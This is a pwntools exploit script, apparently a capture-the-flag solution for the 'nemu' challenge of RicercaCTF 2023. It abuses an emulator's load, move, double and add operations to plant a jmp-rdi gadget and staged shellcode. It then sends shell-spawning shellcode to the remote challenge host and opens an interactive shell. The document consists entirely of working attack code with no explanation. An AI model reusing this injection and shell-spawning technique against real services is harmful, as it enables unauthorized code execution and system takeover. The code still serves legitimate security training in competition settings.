from pwn import *

sendlineafter = lambda x, y: p.sendlineafter(x, y)
sendline = lambda x: p.sendline(x)

def load(imm):
    sendlineafter(b'opcode: ', b'1')
    sendlineafter(b'operand: ', b'#' + str(imm).encode())

def mov(reg):
    sendlineafter(b'opcode: ', b'2')
    sendlineafter(b'operand: ', b'r' + str(reg).encode())

def dbl(reg):
    sendlineafter(b'opcode: ', b'4')
    sendlineafter(b'operand: ', b'r' + str(reg).encode())

def add(reg):
    sendlineafter(b'opcode: ', b'6')
    sendlineafter(b'operand: ', b'r' + str(reg).encode())

def dbg(p):
    gdb.attach(p)
    pause()

# p = process('./chall')
p = remote('nemu.2023.ricercactf.com', 9002)
context.binary = ELF('./chall')
context.terminal = 'bash'

shellcode = '''
xor edi, edi
mov rsi, rbx
mov edx, esi
xor eax, eax
syscall
ret
'''
shellcode = asm(shellcode)

jmp_rdi = u32(asm('jmp rdi').ljust(4, b'\0'))
jmp_rdi <<= 16

load(jmp_rdi)
mov(1)
for _ in range(16):
    dbl(1)

load(u32(shellcode[4:8]))
mov(3)
load(u32(shellcode[8:12]))
mov(2)
load(u32(shellcode[:4]))

add(0)
sendline(asm(shellcraft.sh()))
add(0)

p.interactive()
